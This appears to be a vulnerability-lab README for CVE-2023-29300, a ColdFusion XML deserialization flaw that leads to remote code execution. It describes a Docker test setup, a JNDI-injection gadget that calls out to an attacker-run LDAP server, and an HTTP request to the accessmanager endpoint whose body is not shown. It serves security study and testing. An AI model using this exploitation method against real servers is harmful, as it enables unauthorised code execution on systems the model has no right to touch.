# Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)

[中文版本(Chinese version)](README.zh-cn.md)

Adobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.

Adobe ColdFusion versions 2018 Update 16 (and earlier), 2021 Update 6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a deserialization of untrusted data vulnerability. Attacker is able to call arbitrary setter function and execute arbitrary commands eventually.

## Vulnerable environment

Start a Adobe ColdFusion 2018.0.15:

```
docker compose up -d
```

After a few minutes wait, visit `http://your-ip:8500/CFIDE/administrator/index.cfm` with password `vulhub`, you can install the Adobe ColdFusion successfully.

## Exploit

To exploit this issue, you have to find a valid gadget to execute arbitrary code in ColdFusion server. The most common gadget is `com.sun.rowset.JdbcRowSetImpl` that uses the JNDI injection to execute the command.

You can start a malicious LDAP server and generate a `CommonsBeanutils1` gadget payload with <https://github.com/java-Chains/web-chains>:

Then, send the following request to ColdFusion server (replace with your LDAP server address):

```
POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8

Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333

```

As you can see, the `touch /tmp/success` is executed successfully:
